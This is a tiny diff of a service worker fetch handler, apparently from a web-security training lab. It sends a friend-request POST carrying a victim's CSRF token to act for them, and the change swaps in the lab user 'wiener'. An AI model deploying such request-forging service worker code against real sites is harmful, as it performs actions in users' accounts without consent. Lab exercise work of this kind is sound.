@@ -28,7 +28,7 @@ self.addEventListener("fetch", (event) => {
             headers: {
               "Content-Type": "application/x-www-form-urlencoded"
             },
-            body: `username=${yourUsername}&csrf_token=${encodeURIComponent(csrf)}`
+            body: `username=${wiener}&csrf_token=${encodeURIComponent(csrf)}`
           });
           console.log("[ACTION] Sent friend request to bot.");
         } else {
